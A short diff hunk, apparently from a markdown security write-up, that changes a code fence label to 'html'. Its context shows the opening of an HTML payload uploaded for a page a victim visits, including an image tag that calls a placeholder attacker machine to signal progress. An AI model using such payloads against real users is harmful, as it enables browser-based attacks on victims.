@@ -78,7 +78,7 @@ No better time to try than now, and sure enough, after some failed tries, chrome
 
 This was achieved by uploading a html payload like this for the page the victim is going to visit:
 
-```htmlembedded=
+```html
 <html>
     <body>
         <img src="http://<your_machine>/start_of_prep"/> <!-- Debugging -->
